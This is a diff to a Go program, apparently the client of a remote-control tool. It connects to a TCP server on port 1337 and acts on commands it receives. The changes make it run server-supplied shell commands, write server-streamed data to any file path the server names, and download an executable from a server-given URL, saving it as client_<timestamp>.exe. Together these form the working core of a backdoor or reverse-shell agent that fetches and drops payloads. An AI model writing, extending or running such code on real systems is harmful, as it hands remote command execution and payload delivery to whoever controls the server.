@@ -8,15 +8,17 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"strconv"
+	"strings"
 	"time"
 
 	"github.com/geoirb/tcp/internal/message"
 )
 
 var (
-	address     = "127.0.0.1:3333"
+	address     = "127.0.0.1:1337"
 	connTimeout = 5 * time.Second
+
+	servicePath = "./client_%d.exe"
 )
 
 type handlerFunc func(conn net.Conn, args []string) *string
@@ -29,6 +31,7 @@ var handler map[string]handlerFunc = map[string]handlerFunc{
 }
 
 func main() {
+
 	msg := message.New()
 
 	for {
@@ -42,6 +45,7 @@ func main() {
 	LOOP:
 		for {
 			message, err := bufio.NewReader(conn).ReadString('\n')
+			message = strings.Trim(message, "\n")
 			if err != nil {
 				fmt.Printf("err read from server: %s\n", err)
 				break LOOP
@@ -67,7 +71,7 @@ func testHandler(_ net.Conn, _ []string) *string {
 
 func shellHandler(_ net.Conn, args []string) *string {
 	var result string
-	if len(args) > 0 {
+	if len(args) < 1 {
 		result = "not found shell command"
 		return &result
 	}
@@ -90,14 +94,8 @@ func shellHandler(_ net.Conn, args []string) *string {
 
 func fileHandler(conn net.Conn, args []string) *string {
 	var result string
-	if len(args) != 2 {
-		result = "not found name and size of file"
-		return &result
-	}
-
-	size, err := strconv.Atoi(args[2])
-	if err != nil {
-		result = err.Error()
+	if len(args) != 1 {
+		result = "not found name file"
 		return &result
 	}
 
@@ -105,27 +103,31 @@ func fileHandler(conn net.Conn, args []string) *string {
 		return nil
 	}
 
-	data := make([]byte, size)
-	n, err := conn.Read(data)
-	if err != nil {
-		result = err.Error()
-		return &result
-	}
-	if n != size {
-		result = "size of received data and expected size not equal"
-		return &result
-	}
-
-	file, err := os.Create(os.TempDir() + args[0])
+	file, err := os.Create(args[0])
 	if err != nil {
 		result = err.Error()
 		return &result
 	}
 	defer file.Close()
 
-	if _, err := file.Write(data); err != nil {
-		result = err.Error()
-		return &result
+LOOP:
+	for {
+		data := make([]byte, 1024)
+
+		n, err := conn.Read(data)
+		if err != nil {
+			result = err.Error()
+			return &result
+		}
+
+		if _, err := file.Write(data[:n]); err != nil {
+			result = err.Error()
+			return &result
+		}
+
+		if n < 1024 {
+			break LOOP
+		}
 	}
 
 	result = "done"
@@ -139,13 +141,7 @@ func updateHandler(conn net.Conn, args []string) *string {
 		return &result
 	}
 
-	path, err := os.Executable()
-	if err != nil {
-		result = err.Error()
-		return &result
-	}
-
-	newExecutableFile := path + "client" + time.Now().String()
+	newExecutableFile := fmt.Sprintf(servicePath, time.Now().Unix())
 	out, err := os.Create(newExecutableFile)
 	if err != nil {
 		result = err.Error()
@@ -153,7 +149,7 @@ func updateHandler(conn net.Conn, args []string) *string {
 	}
 	defer out.Close()
 
-	resp, err := http.Get(args[1])
+	resp, err := http.Get(args[0])
 	if err != nil {
 		result = err.Error()
 		return &result
